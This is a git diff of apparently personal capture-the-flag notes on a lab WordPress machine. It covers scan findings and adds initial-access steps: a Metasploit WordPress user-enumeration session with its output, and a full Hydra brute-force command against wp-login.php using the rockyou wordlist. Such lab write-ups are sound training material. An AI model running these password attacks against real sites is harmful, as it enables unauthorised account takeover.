@@ -128,7 +128,12 @@ PORT   STATE SERVICE
 |_    WWW-Mechanize/1.34
 |_http-xssed: No previously reported XSS vuln.
 ```
-* Nessus scan results.
+### Nessus scan results.
+* 4 x medium severity.
+  * SSH Terrapin Prefix Truncation Weakness (CVE-2023-48795) is only vulnerability with public exploit.
+* 2 x Low severity.
+  * No public exploits.
+
 ### TCP/21
 * vsftpd 3.0.3
   * No public exploits on Exploit db.
@@ -166,9 +171,11 @@ gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/
 ```
 * Apache 2.4.29.
   * No public exploits on Exploit db.
+#### /wordpress/
+* Single "All in One" page published with "elyana" as author.
 #### wordpress/wp-login.php
 * Default Wordpress credentials are admin / password.
- * Trying these resulted in "Unknown username. Check again or try your email address." message. This verifies that admin account has been renamed.
+ * Trying these resulted in "Unknown username. Check again or try your email address." message.
 #### /hackathons directory
 * Displays "Damn how much I hate the smell of *Vinegar :/* !!!" 
 * Viewing page source displays comments at bottom of page.
@@ -178,7 +185,20 @@ gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/
 ```
 ## Initial Access
 * enumerate openSSH users?
-* bruteforce /wordpress/wp-admin.php using Hydra?
+* enumerate Wordpress users using Metasploit.
+```
+msf > use auxiliary/scanner/http/wordpress_login_enum
+msf auxiliary(wordpress_login_enum) > set rhosts TARGET_IP
+msf auxiliary(wordpress_login_enum) > set targeturi /wordpress
+msf auxiliary(wordpress_login_enum) > set username elyana
+msf auxiliary(wordpress_login_enum) > set pass_file /usr/share/wordliasts/rockyou.txt
+msf auxiliary(wordpress_login_enum) > exploit
+```
+```
+[+] /wordpress - Found user 'elyana' with id 1
+```
+* bruteforce /wordpress/wp-admin.php using Hydra
+```
 ```
 hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Unknown username. Check again or try your email address." -vV
 ```
